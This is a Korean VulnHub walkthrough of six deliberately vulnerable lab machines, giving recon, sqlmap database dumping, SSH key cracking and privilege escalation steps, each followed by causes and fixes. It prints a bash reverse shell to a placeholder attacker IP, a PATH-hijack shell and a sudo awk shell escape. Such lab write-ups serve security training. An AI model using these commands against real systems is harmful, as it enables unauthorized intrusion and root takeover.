# VulnHub 상세 풀이 - 확인된 기록

> **Authorized lab only / Spoiler**  
> 아래 명령은 의도적으로 취약한 오프라인 VM을 격리된 실습망에서 분석한 기록입니다. `<TARGET_IP>`, `<ATTACKER_IP>`, `<PORT>`는 각자의 로컬 환경 값으로 바꿉니다.

## 1. Mercury

### 정찰

```bash
nmap -sC -sV -p- <TARGET_IP>
```

- 8080 웹 애플리케이션과 추가 엔드포인트를 확인했습니다.
- 입력값에 따른 오류와 응답 차이를 관찰해 SQL Injection 가능성을 점검했습니다.

### 웹 입력점과 DB 열거

```bash
sqlmap -u "http://<TARGET_IP>:8080/<ENDPOINT>?id=1" --batch --dbs
sqlmap -u "http://<TARGET_IP>:8080/<ENDPOINT>?id=1" --batch -D <DB> --tables
sqlmap -u "http://<TARGET_IP>:8080/<ENDPOINT>?id=1" --batch -D <DB> -T <TABLE> --dump
```

이 단계에서 얻은 실습 계정으로 SSH 접근을 확인했습니다. 공개본에는 자격증명 자체보다 **입력 검증 실패가 서버 계정 노출로 확대된 경로**를 남깁니다.

### 계정 전환과 권한 확인

```bash
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

추가 단서를 디코딩해 다른 로컬 계정으로 전환한 뒤, sudo 허용 스크립트가 `tail`을 절대경로 없이 호출하는 것을 확인했습니다.

### PATH hijacking 재현

```bash
mkdir -p /tmp/lab-path
printf '#!/bin/sh\n/bin/sh\n' > /tmp/lab-path/tail
chmod +x /tmp/lab-path/tail
PATH=/tmp/lab-path:$PATH sudo <ALLOWED_SCRIPT>
```

### 원인과 개선

- 원인: 사용자 입력 기반 SQL 쿼리, 계정정보 노출·재사용, sudo 스크립트의 상대경로 명령 실행
- 개선: Prepared Statement, DB·OS 계정 분리, 비밀 회전, `/usr/bin/tail` 같은 절대경로, sudo `secure_path`, 최소 권한

## 2. Breakout

### 서비스·사용자 열거

```bash
nmap -sC -sV -p- <TARGET_IP>
enum4linux <TARGET_IP>
dirb http://<TARGET_IP>
dirb https://<TARGET_IP>:<MANAGEMENT_PORT>
```

웹 소스에서 인코딩 문자열을 발견했고, 포맷을 식별해 교육용 계정 단서로 해석했습니다. SMB 열거 결과와 교차 확인해 관리 화면 로그인 대상을 좁혔습니다.

### 제한된 셸

공격 VM에서 수신 대기 후, 관리 화면의 허가된 명령 실행 기능으로 로컬 실습 셸을 확인했습니다.

```bash
nc -lvnp <PORT>
# 격리 VM의 교육용 셸에서만 실행
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'
```

### capability와 백업 정보

```bash
getcap -r / 2>/dev/null
ls -la /var/backups
```

과도한 capability가 부여된 보관 도구를 이용해 접근 제한된 백업 내용을 읽을 수 있었고, 노출된 실습 자격정보가 root 전환으로 이어졌습니다.

### 원인과 개선

- 원인: 관리 서비스 노출, 소스 내 비밀, 과도한 capability, 평문 백업 자격정보
- 개선: 관리망 제한, secret manager, capability 기준선·정기 점검, 백업 암호화·권한 분리

## 3. Earth

### 가상 호스트와 노출 파일

```bash
nmap -sV -p- <TARGET_IP>
dirb http://<TARGET_IP>
dirb https://<TARGET_IP>
```

TLS 인증서의 호스트명과 `robots.txt`를 연결해 가상 호스트·테스트 파일을 찾았습니다. XOR로 표시된 교육용 데이터를 CyberChef에서 해석해 사용자 단서를 확인했습니다.

### 셸과 특수권한 조사

```bash
find / -perm -4000 -type f 2>/dev/null
file /usr/bin/<SUID_BINARY>
```

SUID 실행파일을 공격 VM으로 복사해 동적 함수 호출을 관찰했습니다.

```bash
ltrace ./<SUID_BINARY_COPY>
```

실행파일이 존재 여부만 확인하는 파일 경로를 파악한 뒤, 격리 VM에서 필요한 조건을 재현해 root flag를 확인했습니다.

### 원인과 개선

- 원인: 인증서·robots의 과도한 정보, 웹 명령 실행, 안전하지 않은 SUID 도구
- 개선: 메타데이터 최소화, 사용자 명령 실행 제거, SUID 제거 또는 권한 분리, 무결성 모니터링

## 4. Lupin

### 숨은 경로와 SSH 키

```bash
ffuf -u http://<TARGET_IP>/~FUZZ -w <WORDLIST> -fc 403
ffuf -u http://<TARGET_IP>/~<USER>/.FUZZ -w <WORDLIST> -e .txt,.zip,.html -fc 403
```

숨은 파일의 Base58 데이터를 해석해 교육용 SSH 키를 복원하고 키 사용 조건을 분석했습니다.

```bash
chmod 600 <LAB_PRIVATE_KEY>
ssh2john <LAB_PRIVATE_KEY> > <HASH_FILE>
john --wordlist=<LAB_WORDLIST> <HASH_FILE>
ssh -i <LAB_PRIVATE_KEY> <LAB_USER>@<TARGET_IP>
```

### Python 모듈 경로와 sudo 정책

```bash
sudo -l
ls -la /usr/lib/python3*/<MODULE>.py
```

낮은 권한 사용자가 Python 표준 모듈 경로를 수정할 수 있었고, 다른 사용자 권한으로 해당 모듈을 불러오는 스크립트가 sudo 허용되어 있었습니다. 이후 과도한 패키지 설치 권한까지 연결되어 root flag를 확인했습니다.

### 원인과 개선

- 원인: 개인키 노출, 약한 키 암호, 시스템 모듈 쓰기권한, 과도한 sudo/pip 권한
- 개선: 키 폐기·재발급, 디렉터리 권한 고정, sudo 명령·인자 제한, 패키지 관리 권한 분리

## 5. Ripper

### 기록된 흐름

1. Nmap·Gobuster로 웹 경로와 서비스 정보를 확인했습니다.
2. 노출 문서와 시스템 기록에서 일반 사용자 접근 단서를 찾았습니다.
3. SSH 사용자 세션에서 백업·로그·관리 서비스 흔적을 조사했습니다.
4. 로그에 남은 실습 자격정보가 Webmin 관리자 접근과 root flag로 이어졌습니다.

원본 메모의 정확한 경로·계정값은 비공개 증거로 보관하고, 재현 시 명령과 화면을 다시 캡처해 이 섹션을 보완합니다.

### 원인과 개선

- 원인: 웹 경로에 민감 문서 노출, 로그·백업에 자격정보 기록, 관리 서비스 접근 통제 부족
- 개선: 로그 마스킹, 비밀 회전, 관리 서비스 VPN/관리망 제한, 백업파일 접근 감사

## 6. DoubleTrouble

### 1단계 VM

```bash
nmap -sC -sV -p- <TARGET_IP>
gobuster dir -u http://<TARGET_IP> -w <WORDLIST>
stegseek <IMAGE> <WORDLIST>
```

이미지 스테가노그래피에서 교육용 로그인 단서를 얻고, 파일 업로드 기능을 통해 제한된 셸을 확보했습니다. `sudo -l`에서 허용된 awk를 확인해 1단계 root에 도달했습니다.

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

### 2단계 VM

```bash
sqlmap -u http://<TARGET_IP>/index.php --forms --batch --dbs
sqlmap -u http://<TARGET_IP>/index.php --forms --batch -D <DB> --tables
sqlmap -u http://<TARGET_IP>/index.php --forms --batch -D <DB> -T <TABLE> --dump
```

DB에서 얻은 실습 계정으로 SSH user flag를 확인하고, 오래된 커널의 Dirty COW 가능성을 조사했습니다. 현재 로컬 메모에는 2단계 최종 flag 화면이 남아 있지 않아, 본인이 확인한 완료 이력과 별도로 재현 증거를 보완할 예정입니다.

### 원인과 개선

- 원인: 업로드 파일 실행, 과도한 sudo awk, SQLi, 오래된 커널
- 개선: 업로드 격리·실행권한 제거, sudo 허용 제거, 매개변수화 쿼리, 커널 패치·자산 수명주기 관리

